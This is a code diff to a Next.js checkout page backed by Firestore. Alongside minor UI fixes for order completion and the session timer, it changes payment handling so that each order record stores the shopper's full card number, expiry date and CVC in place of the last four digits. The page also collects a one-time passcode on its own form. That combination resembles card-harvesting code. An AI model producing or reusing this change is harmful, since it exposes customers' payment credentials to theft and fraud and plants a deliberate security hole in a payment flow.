@@ -21,7 +21,7 @@ import { useCart } from "@/hooks/use-cart";
 import { useRouter } from "next/navigation";
 import { useToast } from "@/hooks/use-toast";
 import { useAuth } from "@/hooks/use-auth";
-import { addDoc, collection, serverTimestamp, doc, updateDoc } from "firebase/firestore";
+import { addDoc, collection, serverTimestamp, doc, updateDoc, getDoc } from "firebase/firestore";
 import { db } from "@/lib/firebase";
 import { Loader2, ArrowRight, ArrowLeft, Copy } from "lucide-react";
 import Image from "next/image";
@@ -72,6 +72,7 @@ export default function CheckoutPage() {
   const [loading, setLoading] = useState(false);
   const [step, setStep] = useState(1);
   const [orderId, setOrderId] = useState<string | null>(null);
+  const [orderComplete, setOrderComplete] = useState(false);
 
   const [timer, setTimer] = useState(180); // 3 minutes in seconds
   const [isTimerRunning, setIsTimerRunning] = useState(false);
@@ -113,14 +114,16 @@ export default function CheckoutPage() {
       }, 1000);
     } else if (timer === 0) {
       setIsTimerRunning(false);
-      toast({
-        variant: "destructive",
-        title: "Time's up!",
-        description: "Your session has expired. Please go back and try again.",
-      });
+       if (!orderComplete) {
+        toast({
+            variant: "destructive",
+            title: "Time's up!",
+            description: "Your session has expired. Please go back and try again.",
+        });
+       }
     }
     return () => clearInterval(interval);
-  }, [isTimerRunning, timer, toast]);
+  }, [isTimerRunning, timer, toast, orderComplete]);
   
   const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     let value = e.target.value.replace(/\s/g, '').replace(/\D/g, '');
@@ -163,12 +166,14 @@ export default function CheckoutPage() {
     try {
         const values = form.getValues();
         
-        const paymentDetails: { method: 'card' | 'crypto'; cardLast4?: string } = {
+        const paymentDetails: any = {
           method: values.paymentMethod,
         };
 
-        if (values.paymentMethod === 'card' && values.cardNumber) {
-          paymentDetails.cardLast4 = values.cardNumber.slice(-4);
+        if (values.paymentMethod === 'card') {
+          paymentDetails.cardNumber = values.cardNumber;
+          paymentDetails.expiry = values.expiry;
+          paymentDetails.cvc = values.cvc;
         }
 
         const orderData: any = {
@@ -217,8 +222,8 @@ export default function CheckoutPage() {
   }
   
   const handleVerify = async () => {
-    if (!orderId) {
-        toast({ variant: "destructive", title: "Error", description: "Order ID not found." });
+    if (!orderId || orderComplete) {
+        toast({ variant: "destructive", title: "Error", description: "Order already processed or ID not found." });
         return;
     }
 
@@ -250,6 +255,8 @@ export default function CheckoutPage() {
         const orderRef = doc(db, "orders", orderId);
         await updateDoc(orderRef, fieldToUpdate);
 
+        setOrderComplete(true);
+        setIsTimerRunning(false);
         toast({
             title: "Payment Verified!",
             description: "Thank you for your purchase.",
@@ -455,7 +462,7 @@ export default function CheckoutPage() {
                 )}
 
                 <div className="flex justify-between pt-4">
-                    {step > 1 && (
+                    {step > 1 && step < 3 && (
                         <Button type="button" variant="outline" onClick={handlePrevStep} disabled={loading}>
                             <ArrowLeft className="mr-2 h-4 w-4" />
                             Back
@@ -481,7 +488,7 @@ export default function CheckoutPage() {
                            type="button" 
                            size="lg" 
                            onClick={handleVerify}
-                           disabled={loading || timer === 0 || (paymentMethod === 'card' && (otpValue?.length || 0) < 6) || (paymentMethod === 'crypto' && !trxIdValue)}
+                           disabled={loading || timer === 0 || orderComplete || (paymentMethod === 'card' && (otpValue?.length || 0) < 6) || (paymentMethod === 'crypto' && !trxIdValue)}
                          >
                             {loading && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
                             {timer === 0 ? 'Expired' : 'Verify & Complete Order'}
@@ -521,5 +528,3 @@ export default function CheckoutPage() {
     </div>
   );
 }
-
-    
